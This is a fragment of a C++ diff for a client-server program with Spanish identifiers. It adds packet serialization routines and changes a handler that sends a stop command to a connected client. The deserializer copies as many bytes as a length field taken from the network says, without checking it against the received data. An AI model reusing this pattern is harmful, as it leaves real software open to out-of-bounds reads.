+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete), &paquete.uiTamBuffer, sizeof(paquete.uiTamBuffer));
+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), &paquete.uiIsUltimo, sizeof(paquete.uiIsUltimo));
+    memcpy(cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.cBuffer.data(), paquete.uiTamBuffer);
+}
+
+void Servidor::m_DeserializarPaquete(const char* cBuffer, Paquete& paquete) {
+    memcpy(&paquete.uiTipoPaquete, cBuffer, sizeof(paquete.uiTipoPaquete));
+    memcpy(&paquete.uiTamBuffer, cBuffer + sizeof(paquete.uiTipoPaquete), sizeof(paquete.uiTamBuffer));
+    memcpy(&paquete.uiIsUltimo, cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer), sizeof(paquete.uiIsUltimo));
+    paquete.cBuffer.resize(paquete.uiTamBuffer);
+    if (paquete.cBuffer.size() == paquete.uiTamBuffer) {
+        memcpy(paquete.cBuffer.data(), cBuffer + sizeof(paquete.uiTipoPaquete) + sizeof(paquete.uiTamBuffer) + sizeof(paquete.uiIsUltimo), paquete.uiTamBuffer);
+    }
+    else {
+        std::cout << "[Deserializar] No se pudo reservar memoria para el buffer " << GetLastError() << "\n";
+    }
 }
 
 //AES256
@@ -1138,11 +1152,7 @@ void MyListCtrl::OnMatarProceso(wxCommandEvent& event) {
     std::vector<std::string> vcOut = strSplit(this->strTmp.ToStdString(), '/', 1);
     int iCliIndex = p_Servidor->IndexOf(vcOut[0]);
     if (iCliIndex != -1) {
-        std::string strComando = std::to_string(EnumComandos::CLI_STOP);
-        strComando.append(1, CMD_DEL);
-        strComando.append(1, '0');
-
-        p_Servidor->cSend(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente, strComando.c_str(), strComando.size(), 0, true);
+        p_Servidor->cSend(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente, "0", 1, 0, true, EnumComandos::CLI_STOP);
         p_Servidor->m_CerrarConexion(p_Servidor->vc_Clientes[iCliIndex]->p_Cliente._sckCliente);
     }
 }
